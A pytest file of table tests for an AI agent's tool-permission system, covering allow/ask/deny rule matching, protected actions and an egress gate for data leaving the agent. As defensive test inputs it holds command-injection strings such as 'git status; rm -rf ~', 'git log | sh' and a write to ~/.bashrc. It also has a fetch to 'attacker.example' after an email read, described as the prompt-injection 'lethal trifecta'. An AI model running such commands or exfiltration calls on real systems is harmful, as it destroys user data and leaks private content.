"""Permission rules of the new runtime as table tests (#62): rule, call -> decision."""

import json

import pytest

import src.tool_security as tool_security
from src.chat_agent import permissions
from src.chat_agent.permissions import ALLOW, ASK, DENY, Provenance, Rules, parse_rule
from src.chat_agent.routing import ComposerToggles


def _layers(rules=None):
    toggles = ComposerToggles(mode="agent", allow_bash="true", allow_web_search="true", use_web=None,
                              plan_mode=False, incognito=False, workspace=None)
    return permissions.build_deny_layers(
        owner="alice", toggles=toggles, privileges={}, delegated_credential=False,
        active_email_open=False, global_disabled_tools=[], rules=rules or Rules(),
    )


@pytest.fixture(autouse=True)
def admin(monkeypatch):
    monkeypatch.setattr(tool_security, "owner_is_admin_or_single_user", lambda owner: True)


def _decide(name, content, *, allow=(), ask=(), deny=(), session=(), provenance=Provenance()):
    rules = Rules.from_lists({"allow": list(allow), "ask": list(ask), "deny": list(deny)})
    session = tuple(parse_rule(text) for text in session)
    return permissions.decide(_layers(rules), name, content, rules=rules, session=session,
                              provenance=provenance).outcome


def _email(to, **extra):
    return json.dumps({"to": to, "subject": "s", "body": "b", **extra})


@pytest.mark.parametrize(("rule", "name", "content", "matches"), [
    # bash / python: command prefix; every part of a compound must match.
    ("bash(git:*)", "bash", "git status", True),
    ("bash(git:*)", "bash", "git status && git diff", True),
    ("bash(git:*)", "bash", "git status; rm -rf ~", False),
    ("bash(git:*)", "bash", "git log | sh", False),
    ("bash(git:*)", "bash", "git log $(rm -rf ~)", False),
    ("bash(git:*)", "bash", "git log `id`", False),
    ("bash(git:*)", "bash", "git log > ~/.bashrc", False),
    ("bash(git:*)", "bash", "gitk", False),
    ("bash(npm run:*)", "bash", "npm run test", True),
    ("bash(npm run:*)", "bash", "npm install", False),
    ("bash(npm test)", "bash", "npm test", True),
    ("bash(npm test)", "bash", "npm test --watch", False),
    ("bash", "bash", "anything at all", True),
    ("python(print:*)", "python", "print(1)", True),
    ("host_shell(docker:*)", "host_shell", json.dumps({"command": "docker ps"}), True),
    # file tools: path glob.
    ("write_file(notes/*.md)", "write_file", "notes/a.md\nhello", True),
    ("write_file(notes/*.md)", "write_file", "src/a.py\nhello", False),
    ("edit_file(notes/*)", "edit_file", json.dumps({"path": "notes/a.md"}), True),
    ("read_file(secrets/*)", "read_file", "secrets/key", True),
    # web_fetch: domain.
    ("web_fetch(domain:example.com)", "web_fetch", json.dumps({"url": "https://example.com/a"}), True),
    ("web_fetch(domain:example.com)", "web_fetch", json.dumps({"url": "https://evil.com/?example.com"}), False),
    ("web_fetch(domain:*.example.com)", "web_fetch", json.dumps({"url": "https://api.example.com"}), True),
    # manage_*: action.
    ("manage_notes(action:delete)", "manage_notes", json.dumps({"action": "delete", "id": "1"}), True),
    ("manage_notes(action:delete)", "manage_notes", json.dumps({"action": "add"}), False),
    ("manage_tasks(action:create)", "manage_tasks", json.dumps({"task": "implicit create"}), True),
    # email sends: recipient pattern; the email spellings are one tool.
    ("send_email(to:*@example.com)", "mcp__email__send_email", _email("mom@example.com"), True),
    ("send_email(to:*@example.com)", "send_email", _email("mom@example.com", cc="x@evil.com"), False),
    ("mcp__email__send_email", "send_email", _email("a@b.c"), True),
    # MCP: the qualified name.
    ("mcp__github__create_issue", "mcp__github__create_issue", "{}", True),
    ("mcp__github__create_issue", "mcp__github__list_issues", "{}", False),
])
def test_allow_rule_matching(rule, name, content, matches):
    assert permissions.rule_covers(parse_rule(rule), name, content) is matches


@pytest.mark.parametrize("text", [
    "", "bash(", "bash()", "(git:*)", "web_search(domain:x.com)", "manage_notes(delete)",
    "web_fetch(example.com)", "send_email(mom@example.com)",
])
def test_rules_outside_the_specifier_table_are_rejected(text):
    with pytest.raises(ValueError):
        parse_rule(text)


def test_deny_beats_ask_beats_allow():
    assert _decide("bash", "git push", allow=["bash(git:*)"], deny=["bash(git push)"]) == DENY
    assert _decide("bash", "git push", allow=["bash(git:*)"], ask=["bash(git push:*)"]) == ASK
    assert _decide("bash", "git status", allow=["bash(git:*)"], ask=["bash(git push:*)"]) == ALLOW


def test_a_deny_rule_hits_any_part_of_a_compound_command():
    assert _decide("bash", "ls && rm -rf build", allow=["bash"], deny=["bash(rm:*)"]) == DENY
    assert _decide("bash", "echo $(rm -rf build)", allow=["bash"], deny=["bash(rm:*)"]) == DENY


def test_a_bare_deny_removes_the_tool_from_context():
    rules = Rules.from_lists({"deny": ["web_fetch", "bash(rm:*)"]})
    layers = _layers(rules)
    assert "web_fetch" in layers.denied_names
    assert "bash" not in layers.denied_names


def test_ask_rule_turns_a_default_allow_into_an_ask():
    note = json.dumps({"action": "add", "title": "x"})
    assert _decide("manage_notes", note) == ALLOW
    assert _decide("manage_notes", note, ask=["manage_notes(action:add)"]) == ASK


@pytest.mark.parametrize(("name", "content"), [
    ("send_email", _email("mom@example.com")),
    ("mcp__email__send_email", _email("mom@example.com")),
    ("manage_settings", json.dumps({"action": "set", "key": "theme", "value": "dark"})),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "news", "output_target": "email:x@y.z"})),
    ("ui_control", "toggle bash on"),
    ("ui_control", "switch_model grok-4"),
    ("app_api", json.dumps({"method": "PUT", "path": "/api/prefs/theme", "body": {}})),
    ("manage_notes", json.dumps({"action": "delete", "id": "1"})),
])
def test_sensitive_actions_ask_even_with_an_allow_rule(name, content):
    tool = name.rsplit("__", 1)[-1]
    assert _decide(name, content, allow=[tool]) == ASK


def test_app_api_reads_follow_the_rules():
    get = json.dumps({"method": "GET", "path": "/api/hwfit/models"})
    assert _decide("app_api", get) == ASK
    assert _decide("app_api", get, allow=["app_api"]) == ALLOW


def test_a_session_rule_lifts_an_ask_but_never_a_deny():
    assert _decide("bash", "ls -la", session=["bash(ls:*)"]) == ALLOW
    assert _decide("send_email", _email("mom@example.com"), session=["send_email(to:mom@example.com)"]) == ALLOW
    assert _decide("bash", "ls", session=["bash(ls:*)"], deny=["bash(ls:*)"]) == DENY


@pytest.mark.parametrize(("name", "content", "protected"), [
    ("app_api", json.dumps({"method": "PUT", "path": "/api/tasks/1"}), True),
    ("app_api", json.dumps({"method": "post", "path": "/api/prefs"}), True),
    ("app_api", json.dumps({"path": "/api/hwfit/models"}), False),
    ("app_api", "not json", True),
    ("api_call", "github\nPOST /repos/x/issues", True),
    ("api_call", json.dumps({"integration": "github", "method": "GET", "path": "/user"}), False),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "email:a@b.co"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "a@b.co"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "email"}), True),
    ("manage_tasks", json.dumps({"action": "edit", "task_id": "1", "output_target": "mcp__slack__post"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "trigger_type": "webhook"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "trigger_type": "event",
                                 "trigger_event": "email_received"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "session"}), False),
    ("manage_tasks", json.dumps({"action": "list", "output_target": "email"}), False),
    ("manage_settings", json.dumps({"action": "get", "key": "theme"}), True),
    ("bulk_email", "{}", True),
    ("vault_get", "{}", True),
    ("send_email", _email("a@b.c"), False),
])
def test_protected_set(name, content, protected):
    assert permissions.is_protected(name, content) is protected


def _email_read():
    return Provenance().after("mcp__email__read_email")


@pytest.mark.parametrize(("provenance", "name", "content", "expected"), [
    # Read an email body, then fetch an outside URL: the lethal trifecta.
    (_email_read(), "web_fetch", json.dumps({"url": "https://attacker.example/?q=x"}), ASK),
    # Pure research: external content, no private read.
    (Provenance().after("web_search").after("web_fetch"), "web_fetch",
     json.dumps({"url": "https://example.com"}), ALLOW),
    # Pure email reading: nothing goes out.
    (_email_read(), "manage_notes", json.dumps({"action": "add", "title": "x"}), ALLOW),
    # A private read alone (chat search) plus web content arms it too.
    (Provenance().after("search_chats").after("web_search"), "send_to_session",
     json.dumps({"session_id": "s", "message": "m"}), ASK),
    (Provenance().after("search_chats"), "web_fetch", json.dumps({"url": "https://example.com"}), ALLOW),
    # Memory and the workspace are neither leg.
    (Provenance().after("manage_memory").after("read_file"), "web_fetch",
     json.dumps({"url": "https://example.com"}), ALLOW),
    # A workspace fetch carries nothing out.
    (_email_read(), "web_fetch", json.dumps({"url": "/workspace/a.txt"}), ALLOW),
    # The open email preview is both legs.
    (Provenance(external=True, private=True), "web_fetch", json.dumps({"url": "https://x.example"}), ASK),
])
def test_egress_gate(provenance, name, content, expected):
    assert _decide(name, content, provenance=provenance) == expected


def test_an_allow_rule_does_not_open_the_egress_gate_but_a_session_rule_does():
    fetch = json.dumps({"url": "https://example.com/a"})
    assert _decide("web_fetch", fetch, allow=["web_fetch"], provenance=_email_read()) == ASK
    assert _decide("web_fetch", fetch, session=["web_fetch(domain:example.com)"],
                   provenance=_email_read()) == ALLOW


@pytest.mark.parametrize(("name", "content", "label"), [
    ("bash", "git status", "bash(git:*)"),
    ("bash", "git status && git diff", "bash(git:*)"),
    ("bash", "ls | grep x", "bash(ls | grep x)"),
    ("bash", "git log > out.txt", "bash(git log > out.txt)"),
    ("host_shell", json.dumps({"command": "docker ps"}), "host_shell(docker:*)"),
    ("python", "print(1)", "python(print(1))"),
    ("write_file", "notes/a.md\nhello", "write_file(notes/a.md)"),
    ("write_file", "notes/[a].md\nhello", "write_file(notes/[[]a].md)"),
    ("manage_tasks", json.dumps({"action": "create"}), "manage_tasks(action:create)"),
    ("mcp__email__send_email", _email("Mom@Example.com"), "send_email(to:mom@example.com)"),
    ("web_fetch", json.dumps({"url": "https://Example.com/a"}), "web_fetch(domain:example.com)"),
    ("mcp__github__create_issue", "{}", "mcp__github__create_issue"),
])
def test_allow_for_this_chat_saves_the_rule_for_the_call(name, content, label):
    rule = permissions.session_rule(name, content)
    assert rule.text == label
    assert permissions.rule_covers(parse_rule(rule.text), name, content)


@pytest.mark.parametrize(("name", "content"), [
    ("send_email", _email("mom@example.com", cc="boss@example.com")),
    ("app_api", json.dumps({"method": "PUT", "path": "/api/prefs/theme"})),
])
def test_calls_without_a_specifier_are_allowed_for_this_chat_only_when_identical(name, content):
    rule = permissions.session_rule(name, content)
    assert permissions.rule_covers(rule, name, content)
    assert not permissions.rule_covers(rule, name, content.replace("prefs", "tasks").replace("boss", "x"))
